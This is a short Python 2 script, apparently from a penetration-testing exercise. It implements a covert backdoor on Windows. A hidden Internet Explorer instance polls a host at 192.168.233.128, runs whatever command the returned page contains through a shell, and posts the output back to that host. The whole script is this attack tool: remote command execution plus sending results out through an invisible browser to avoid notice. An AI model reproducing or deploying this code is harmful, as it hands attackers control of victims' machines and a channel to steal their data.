from win32com.client import Dispatch
from time import sleep
import subprocess

#Create internet explorer instance
ie = Dispatch("InternetExplorer.Application")
#Make it invisible, run it in the background
ie.Visible = 0

#Parameters for POST
dURL = "http://192.168.233.128"
Flags = 0
TargetFrame = ""

while True:
    ie.Navigate("http://192.168.233.128")

    #Wait for browser to finish loading
    while ie.ReadyState != 4:
        sleep(1)

    command = ie.Document.body.innerHTML
    #Convert HTML entities to unicode, e.g. '&amp' becomes '&'
    command = unicode(command)
    #Encode the command into ascii string and ignore any exceptions
    command = command.encode('ascii', 'ignore')
    print '[+] We received command ' + command

    if 'terminate' in command:
        ie.Quit()
        break
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        Data = CMD.stdout.read()
        PostData = buffer(Data)
        ie.Navigate(dURL, Flags, TargetFrame, PostData)
    sleep(3)
